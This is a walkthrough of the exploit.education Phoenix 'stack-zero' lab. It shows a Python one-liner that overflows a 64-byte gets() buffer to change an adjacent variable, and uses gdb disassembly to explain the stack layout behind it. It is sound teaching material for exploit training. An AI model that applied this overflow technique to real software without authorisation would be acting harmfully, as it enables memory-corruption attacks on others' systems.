The source code for this level can be found here: [stack-zero source code](stack-zero.c) (https://exploit.education/phoenix/stack-zero/)

Let us have a look at the man page for the gets function. Under the "Bugs"-section it says: _Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead._ Thus, even though the buffer is only 64 bytes in size, gets does not do any checks to see if we write more bytes than that. The changeme variable should be stored right above the buffer on the stack, so to change the variable, all we have to do is to write a bit outside the buffer. Let us try to feed 65 bytes to the buffer.

```console
user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print("A"*65)' | ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

We could of course be a little more pedagogical by using gdb to look at what actually happens. We open the binary in gdb and disassemble main:

```console
user@phoenix-amd64:/opt/phoenix/amd64$ gdb stack-zero
...output omitted...
gef➤  disassemble main
Dump of assembler code for function main:
   0x00000000004005dd <+0>:	push   rbp
   0x00000000004005de <+1>:	mov    rbp,rsp
   0x00000000004005e1 <+4>:	sub    rsp,0x60
   0x00000000004005e5 <+8>:	mov    DWORD PTR [rbp-0x54],edi
   0x00000000004005e8 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x00000000004005ec <+15>:	mov    edi,0x400680
   0x00000000004005f1 <+20>:	call   0x400440 <puts@plt>
   0x00000000004005f6 <+25>:	mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004005fd <+32>:	lea    rax,[rbp-0x50]
   0x0000000000400601 <+36>:	mov    rdi,rax
   0x0000000000400604 <+39>:	call   0x400430 <gets@plt>
   0x0000000000400609 <+44>:	mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040060c <+47>:	test   eax,eax
   0x000000000040060e <+49>:	je     0x40061c <main+63>
   0x0000000000400610 <+51>:	mov    edi,0x4006d0
   0x0000000000400615 <+56>:	call   0x400440 <puts@plt>
   0x000000000040061a <+61>:	jmp    0x400626 <main+73>
   0x000000000040061c <+63>:	mov    edi,0x400708
   0x0000000000400621 <+68>:	call   0x400440 <puts@plt>
   0x0000000000400626 <+73>:	mov    edi,0x0
   0x000000000040062b <+78>:	call   0x400450 <exit@plt>
End of assembler dump.
```

(If you get a python exception of type UnicodeEncodeError, then running the command "export LC_CTYPE=C.UTF-8" (not in gdb, but in the terminal), should fix it.)

The mov instruction at <main+25> is responsible for setting the locals.changeme variable to 0, as seen on line 31 in the source code. The variable is put on the stack at the address \[rbp-0x10\]. The next instruction lea loads the address \rbp-0x50\ (a pointer to the first byte of the buffer) into the rax register, which is then moved to the rdi register. This register is generally used in x86 for storing the first argument in a function call. Next, gets is called, and our input will be put in the buffer, which starts at rbp-0x50 and ends 63 bytes above at rbp-0x11 (for a total of 64 bytes). Thus, by writing just one byte more than the buffer can hold (and because gets does not prevent us from doing so), the changeme integer gets changed.
